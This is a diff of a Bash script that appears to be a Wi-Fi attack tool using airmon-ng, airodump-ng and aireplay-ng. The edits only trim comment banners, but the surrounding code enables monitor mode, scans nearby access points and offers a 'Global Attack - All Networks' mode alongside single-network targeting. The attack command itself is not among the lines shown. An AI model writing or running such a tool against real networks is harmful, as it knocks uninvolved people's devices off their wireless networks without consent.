@@ -19,11 +19,10 @@ for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
   fi
 done
 
-# -------------------- COLORS --------------------
+#  COLORS 
 RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m";
 PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"
 
-# -------------------- ANIMATION --------------------
 attack_animation() {
     local i=0
     local frames=("💥" "🔥" "⚡" "💣")
@@ -34,7 +33,6 @@ attack_animation() {
     done
 }
 
-# -------------------- HEADER --------------------
 clear
 echo -e "${RED}${BOLD}"
 echo "         .__  _____.__               __                                      "
@@ -66,7 +64,7 @@ done
 read -p "Select interface: " iface_idx
 iface="${interfaces[$iface_idx]}"
 
-# -------------------- MONITOR MODE SETUP --------------------
+#  MONITOR MODE SETUP 
 echo -e "\n${CYAN}🔧 Enabling monitor mode on ${YELLOW}$iface${CYAN}...${RESET}"
 airmon-ng check kill &>/dev/null
 ip link set "$iface" down
@@ -74,7 +72,7 @@ iw dev "$iface" set type monitor
 ip link set "$iface" up
 iw dev "$iface" set power_save off
 
-# -------------------- SCANNING --------------------
+#  SCANNING 
 scan_file="scan_$(date +%s)"
 echo -e "\n${GREEN}📡 Scanning for targets - window will auto close in 10s...${RESET}"
 sleep 2
@@ -88,7 +86,7 @@ for i in {9..1}; do
 done
 echo -e "\r${GREEN}Scan complete.${RESET}"
 
-# -------------------- PARSE SCAN --------------------
+#  PARSE SCAN 
 csv_file="${scan_file}-01.csv"
 if [[ ! -f "$csv_file" ]]; then 
     echo -e "${RED}[!] No networks detected.${RESET}"
@@ -106,7 +104,7 @@ if [[ ${#aps[@]} -eq 0 ]]; then
     exit 1
 fi
 
-# -------------------- DISPLAY TARGETS --------------------
+# - DISPLAY TARGETS 
 echo -e "\n${PURPLE}${BOLD}🎯 Detected Networks:${RESET}"
 echo -e "${YELLOW}------------------------------------------------${RESET}"
 printf "${BOLD}%-20s %-4s %s${RESET}\n" "BSSID" "CH" "ESSID"
@@ -117,7 +115,7 @@ done
 echo -e "${YELLOW}------------------------------------------------${RESET}"
 echo -e "${RED}${BOLD}Total networks found: ${#aps[@]}${RESET}"
 
-# -------------------- ATTACK MODE SELECTION --------------------
+#  ATTACK MODE SELECTION 
 echo -e "\n${CYAN}${BOLD}[0] Global Attack - All Networks"
 echo -e "[1] Single Network Target${RESET}"
 read -p "Choose attack mode [0/1]: " mode
@@ -134,7 +132,7 @@ else
     selected=("${aps[@]}")
 fi
 
-# -------------------- CLEANUP ON EXIT --------------------
+# CLEANUP ON EXIT 
 cleanup() {
     echo -e "\n${YELLOW}${BOLD}⚙️  Stopping attacks and restoring interface...${RESET}"
     killall aireplay-ng xterm &>/dev/null
@@ -166,7 +164,7 @@ for ap in "${selected[@]}"; do
 
 done
 
-# -------------------- EXIT CONFIRM --------------------
+#  EXIT CONFIRM 
 while true; do
     echo -e "\n${YELLOW}${BOLD}Do you want to stop the attack and restore your network? (y/n): ${RESET}"
     read -r answer
